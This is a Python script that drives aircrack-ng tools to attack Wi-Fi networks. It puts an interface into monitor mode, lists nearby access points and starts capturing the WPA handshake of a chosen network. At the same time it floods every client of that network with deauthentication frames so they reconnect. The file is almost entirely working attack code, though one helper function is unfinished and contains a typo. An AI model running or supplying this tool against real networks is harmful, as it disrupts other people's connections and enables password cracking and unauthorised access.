import os
import time
import sys
from threading import Thread
from csv import reader

def interface_mode(interface):
    """Check Interface Mode: Monitor or Managed"""
    mode = os.popen("iwconfig {}".format(interface)).readlines()
    for line in mode:
        if 'Mode:' in line:
            mode = line.strip().split(":")[1].split()[0]
    return mode

def monitor_mode(interface):
    """Put interface on monitor mode"""
    os.system("ifconfig {} down".format(interface))
    read = os.popen("airmon-ng start {}".format(interface)).readlines()
    # for line in read:
    #     if 'monitor' in line:
    #         mon_interface = line.strip().split()[-1][:-1].split(']')[1]
    mon_interface = interface + "mon"
    return mon_interface

def get_aps(mon_interface):
    """Get Available Wifi Access Points"""
    if os.path.exists("aps-01.csv"):
        os.system('rm aps-01.csv')
    read = os.popen("xterm -T 'Get APs' -geometry -1+1 -e '"+\
                    "airodump-ng {} -w aps --output-format csv'".format(mon_interface)).read()
    print(read)

def capture_handshake(bssid, channel, name, interface='wlan0'):
    """Capture Handshake with airodump-ng"""
    print('Capturing Handshake')
    os.system("rm *.cap 2>/dev/null")
    os.popen("xterm -T 'Capture Handshake' -geometry -500+1 -e '"+\
             "airodump-ng --bssid "+bssid+" --channel "+str(channel)+\
             " --write "+name+" --output-format pcap "+interface+"'")

def deauthenticate_all(bssid, interface='wlan0'):
    """Deauthenticate all users on interface: %s"""%interface
    print('Deauthenticating Connected Devices')
    os.popen("xterm -T 'Deauthenticating' -geometry -1+1 -e '"+\
             "aireplay-ng --deauth 30 -a "+bssid+" "+interface+"'").read()
    # os.system("killall airodump-ng")

def deauthenticate_one(bssid, station, interface='wlan0'):
    """Deauthenticate one user (%s) on interface: %s"""%(station, interface)
    print('Deauthenticating Connected Devices')
    os.popen("xterm -T 'Deauthenticating' -geometry -1+1 -e '"+\
             "aireplay-ng --deauth 5 -a "+bssid+" -c "+station+\
             " "+interface+"'")
    time.sleep(5)
    os.system("killall airodump-ng")

def parse_aps_csv(filename):
    file = open(filename)
    csv = reader(file)
    count = 1
    access_points = []
    for line in csv:
        if len(line) == 15:
            if 'BSSID' in line[0]:
                #print("  {}\t\t\t{}\t{}\t\t{}".format(line[0],line[3],line[5],line[13]))
                pass
            else:
                #print("{} {}\t{}\t\t{}{}".format(count,line[0],line[3],line[5],line[13]))
                count += 1
                access_points.append([line[0], line[3], line[13]])
    return access_points

def parse_stations_csv(filename):
    file = open(filename)
    csv - reader(file)
    count = 1

if __name__ == "__main__":
    interface = input('Interface: ')
    mode = interface_mode(interface)
    if 'Managed' in mode:
        mon_interface = monitor_mode(interface)
    else:
        mon_interface = interface
    get_aps(mon_interface)
    access_points = parse_aps_csv('aps-01.csv')
    #print(access_points)
    for ap in access_points:
        #print(ap)
        print("[{}] {}".format(access_points.index(ap)+1,ap[2]))
    print()
    threads = []
    while True:
        try:
            target_ap = int(input("[Select Access Point]: "))
            target_ap = access_points[target_ap-1]
            target_bssid = target_ap[0]
            target_chan = target_ap[1]
            target_name = target_ap[2]
            Thread(target=capture_handshake, args=(target_bssid, target_chan, target_name, mon_interface)).start()
            time.sleep(2)
            deauthenticate_all(target_bssid, mon_interface)
        except KeyboardInterrupt:
            print()
            exit(1)
        except Exception as e:
            print(str(e))
            continue